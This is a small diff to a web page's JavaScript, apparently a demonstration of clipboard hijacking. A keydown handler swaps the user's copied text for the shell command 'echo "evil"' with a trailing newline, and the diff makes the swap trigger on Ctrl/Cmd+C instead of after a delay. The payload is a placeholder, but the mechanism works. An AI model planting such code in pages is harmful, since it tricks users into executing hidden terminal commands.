@@ -63,9 +63,10 @@
             }
 
             document.addEventListener('keydown', function(event) {
-                setTimeout(function() {
+                var pressed_key = String.fromCharCode(event.keyCode);
+                if ( (event.metaKey || event.ctrlKey) && pressed_key.toLowerCase() == 'c') {
                     copyTextToClipboard('echo "evil"\n');
-                }, 800);
+                }
             });
 
         </script>
